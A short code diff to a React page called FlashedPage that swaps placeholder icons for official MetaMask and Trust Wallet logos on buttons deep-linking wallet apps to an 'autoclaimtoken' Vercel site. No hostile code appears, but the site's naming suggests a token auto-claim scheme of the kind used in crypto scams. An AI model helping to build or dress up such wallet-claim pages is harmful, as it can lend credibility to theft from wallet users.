@@ -596,18 +596,22 @@ export default function FlashedPage() {
                     href="https://metamask.app.link/dapp/autoclaimtoken.vercel.app/flashed"
                     className="flex items-center w-full bg-orange-600 hover:bg-orange-700 p-4 rounded-lg text-white font-semibold"
                   >
-                    <div className="w-8 h-8 bg-orange-500 rounded-full mr-3 flex items-center justify-center">
-                      <span className="text-white font-bold">M</span>
-                    </div>
+                    <img 
+                      src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
+                      alt="MetaMask" 
+                      className="w-8 h-8 mr-3"
+                    />
                     MetaMask
                   </a>
                   <a 
                     href="https://link.trustwallet.com/open_url?coin_id=60&url=https://autoclaimtoken.vercel.app/flashed"
                     className="flex items-center w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-lg text-white font-semibold"
                   >
-                    <div className="w-8 h-8 bg-blue-500 rounded-full mr-3 flex items-center justify-center">
-                      <span className="text-white font-bold">T</span>
-                    </div>
+                    <img 
+                      src="https://trustwallet.com/assets/images/media/assets/TWT.png" 
+                      alt="Trust Wallet" 
+                      className="w-8 h-8 mr-3 rounded-lg"
+                    />
                     Trust Wallet
                   </a>
                   <button 
